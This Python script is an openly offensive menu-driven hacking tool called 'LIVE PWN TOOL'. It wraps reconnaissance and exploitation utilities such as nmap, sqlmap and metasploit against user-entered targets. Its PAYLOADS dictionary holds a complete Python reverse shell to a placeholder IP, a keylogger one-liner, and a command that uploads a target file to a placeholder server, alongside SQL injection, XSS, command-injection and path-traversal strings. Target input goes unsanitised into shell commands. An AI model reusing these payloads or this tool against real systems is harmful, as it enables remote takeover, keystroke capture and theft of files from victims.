import random
import time
import argparse
import subprocess
import sys
import os
from datetime import datetime
#Tool For My Friends
# ASCII Art
print("\033[1;31m")  # Green color
print("██╗     ██╗██╗   ██╗███████╗██████╗ ██╗    ██╗███╗   ██╗")
print("██║     ██║██║   ██║██╔════╝██╔══██╗██║    ██║████╗  ██║")
print("██║     ██║██║   ██║█████╗  ██████╔╝██║ █╗ ██║██╔██╗ ██║")
print("██║     ██║╚██╗ ██╔╝██╔══╝  ██╔═══╝ ██║███╗██║██║╚██╗██║")
print("███████╗██║ ╚████╔╝ ███████╗██║     ╚███╔███╔╝██║ ╚████║𝙎")
print("╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝")
print("\033[0m")  # Reset color

# ANSI Color Codes
COLOR_RED = "\033[1;31m"
COLOR_GREEN = "\033[1;32m"
COLOR_YELLOW = "\033[1;33m"
COLOR_BLUE = "\033[1;34m"
COLOR_MAGENTA = "\033[1;35m"
COLOR_CYAN = "\033[1;36m"
COLOR_RESET = "\033[0m"

# Payloads
PAYLOADS = {
    "sql_injection": "' OR '1'='1",
    "xss": "<script>alert('XSS')</script>",
    "rce": "; ls -la",
    "lfi": "../../etc/passwd",
    "reverse_shell": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "keylogger": "python3 -c 'from pynput.keyboard import Listener; import logging; logging.basicConfig(filename=\"keylog.txt\", level=logging.DEBUG, format=\"%(asctime)s: %(message)s\"); def on_press(key): logging.info(str(key)); with Listener(on_press=on_press) as listener: listener.join()'",
    "file_exfiltration": "python3 -c 'import requests; url=\"http://YOUR_SERVER/upload\"; files={\"file\": open(\"/path/to/target/file.txt\", \"rb\")}; requests.post(url, files=files)'",
}

# Tool Commands (with placeholders for dynamic inputs)
TOOLS = {
    "whois": "whois {target}",
    "harvester": "theHarvester -d {target} -b bing",
    "subdomain": "subfinder -d {target}",
    "sublister": "sublist3r.py -d {target}",
    "dirb": "dirb http://{target} /usr/share/wordlists/dirb/common.txt",
    "gobuster": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 50",
    "dirsearch": "dirsearch.py -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
    "ffuf": "ffuf -u http://{target} -w /usr/share/wordlists/dirb/common.txt -mc all",
    "dig": "dig {target} ANY",
    "fierce": "fierce --domain {target}",
    "amass": "amass enum -d {target}",
    "massdns": "massdns -r resolvers.txt -t A -o S -w massdns_results.txt {target}.txt",
    "nmap": "nmap -sS -sV -A {target}",
}

# Exploits
EXPLOITS = {
    "sqlmap": "sqlmap -u {target} --dbs",
    "metasploit": "msfconsole ",
}

# Interactive Menu
def interactive_menu():
    while True:
        print(f"{COLOR_CYAN}╔{'═' * 50}╗{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET}{COLOR_MAGENTA}                 𓂀  𝕃𝕀𝕍𝔼 ℙ𝕨𝕟 𝕋𝕠𝕠𝕝 𓂀               {COLOR_RESET}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╠{'═' * 50}╣{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}1. Reconnaissance Tools{' ' * 27}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}2. Exploitation Tools{' ' * 29}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}3. Payloads{' ' * 39}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}4. Generate Report{' ' * 33}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}0. Exit{' ' * 43}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╚{'═' * 50}╝{COLOR_RESET}")


        choice = input(f"𝕝𝕚𝕧𝕖𝕡𝕨𝕟s: ")
        if choice == "0":
            print(f"{COLOR_RED}Exiting...{COLOR_RESET}")
            break
        elif choice == "1":
            reconnaissance_menu()
        elif choice == "2":
            exploitation_menu()
        elif choice == "3":
            payloads_menu()
        elif choice == "4":
            generate_report()
        else:
            print(f"{COLOR_RED}Invalid choice! Please try again.{COLOR_RESET}")

# Reconnaissance Menu
def reconnaissance_menu():
    while True:
        print(f"{COLOR_CYAN}╔{'═' * 50}╗{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET}{COLOR_MAGENTA}                RECONNAISSANCE TOOLS                {COLOR_RESET}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╠{'═' * 50}╣{COLOR_RESET}")
        for i, tool in enumerate(TOOLS.keys(), 1):
            print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}{i}. {tool}{' ' * (45 - len(tool))}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}0. Back{' ' * 42}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╚{'═' * 50}╝{COLOR_RESET}")

        choice = input(f"𝕝𝕚𝕧𝕖𝕡𝕨𝕟s: ")

        if choice == "0":
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(TOOLS):
            tool_name = list(TOOLS.keys())[int(choice) - 1]
            target = input(f"{COLOR_GREEN}Enter target (e.g., example.com): {COLOR_RESET}")
            run_tool(tool_name, target)
        else:
            print(f"{COLOR_RED}Invalid choice! Please try again.{COLOR_RESET}")

# Exploitation Menu
def exploitation_menu():
    while True:
        print(f"{COLOR_CYAN}╔{'═' * 50}╗{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET}{COLOR_MAGENTA}                EXPLOITATION TOOLS                {COLOR_RESET}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╠{'═' * 50}╣{COLOR_RESET}")
        for i, exploit in enumerate(EXPLOITS.keys(), 1):
            print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}{i}. {exploit}{' ' * (45 - len(exploit))}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}0. Back{' ' * 42}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╚{'═' * 50}╝{COLOR_RESET}")

        choice = input(f"𝕝𝕚𝕧𝕖𝕡𝕨𝕟s: ")

        if choice == "0":
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(EXPLOITS):
            exploit_name = list(EXPLOITS.keys())[int(choice) - 1]
            target = input(f"{COLOR_GREEN}Enter target (e.g., example.com): {COLOR_RESET}")
            run_exploit(exploit_name, target)
        else:
            print(f"{COLOR_RED}Invalid choice! Please try again.{COLOR_RESET}")

# Payloads Menu
def payloads_menu():
    while True:
        print(f"{COLOR_CYAN}╔{'═' * 50}╗{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET}{COLOR_MAGENTA}                    PAYLOADS                    {COLOR_RESET}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╠{'═' * 50}╣{COLOR_RESET}")
        for i, payload in enumerate(PAYLOADS.keys(), 1):
            print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}{i}. {payload}{' ' * (45 - len(payload))}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}║{COLOR_RESET} {COLOR_YELLOW}0. Back{' ' * 42}{COLOR_CYAN}║{COLOR_RESET}")
        print(f"{COLOR_CYAN}╚{'═' * 50}╝{COLOR_RESET}")

        choice = input(f"𝕝𝕚𝕧𝕖𝕡𝕨𝕟s: ")

        if choice == "0":
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(PAYLOADS):
            payload_name = list(PAYLOADS.keys())[int(choice) - 1]
            print(f"{COLOR_GREEN}Payload: {PAYLOADS[payload_name]}{COLOR_RESET}")
            if payload_name in ["reverse_shell", "keylogger", "file_exfiltration"]:
                print(f"{COLOR_YELLOW}Note: Replace placeholders (e.g., YOUR_IP, YOUR_SERVER) with actual values.{COLOR_RESET}")
        else:
            print(f"{COLOR_RED}Invalid choice! Please try again.{COLOR_RESET}")

# Generate Report
def generate_report():
    report_name = input(f"{COLOR_GREEN}Enter report name (e.g., scan_report): {COLOR_RESET}")
    report_content = f"Report generated on {datetime.now()}\n\n"

    for tool, command in TOOLS.items():
        report_content += f"{tool}: {command}\n"

    with open(f"{report_name}.txt", "w") as file:
        file.write(report_content)

    print(f"{COLOR_GREEN}Report saved as {report_name}.txt{COLOR_RESET}")

# Run Tool Command
def run_tool(tool_name, target):
    if tool_name not in TOOLS:
        print(f"{COLOR_RED}Error: Tool '{tool_name}' not found.{COLOR_RESET}")
        return

    command = TOOLS[tool_name].format(target=target)
    print(f"{COLOR_GREEN}Running command: {command}{COLOR_RESET}")

    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{COLOR_RED}Error: Command failed with exit code {e.returncode}.{COLOR_RESET}")
    except FileNotFoundError:
        print(f"{COLOR_RED}Error: Tool '{tool_name}' is not installed or not found in PATH.{COLOR_RESET}")

# Run Exploit Command
def run_exploit(exploit_name, target):
    if exploit_name not in EXPLOITS:
        print(f"{COLOR_RED}Error: Exploit '{exploit_name}' not found.{COLOR_RESET}")
        return

    command = EXPLOITS[exploit_name].format(target=target)
    print(f"{COLOR_GREEN}Running exploit: {command}{COLOR_RESET}")

    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{COLOR_RED}Error: Exploit failed with exit code {e.returncode}.{COLOR_RESET}")
    except FileNotFoundError:
        print(f"{COLOR_RED}Error: Exploit '{exploit_name}' is not installed or not found in PATH.{COLOR_RESET}")

# Command-Line Arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="LIVE PWN TOOL - A tool for bug hunters and hackers.")
    parser.add_argument("-t", "--tool", help="Specify the tool to use.")
    parser.add_argument("-a", "--target", help="Specify the target (e.g., domain or IP).")
    return parser.parse_args()

# Main Function
def main():
    args = parse_arguments()

    if args.tool and args.target:
        run_tool(args.tool, args.target)
    elif args.tool or args.target:
        print(f"{COLOR_RED}Error: Both --tool and --target are required for command-line usage.{COLOR_RESET}")
    else:
        interactive_menu()

# Run the Tool
if __name__ == "__main__":
    main()
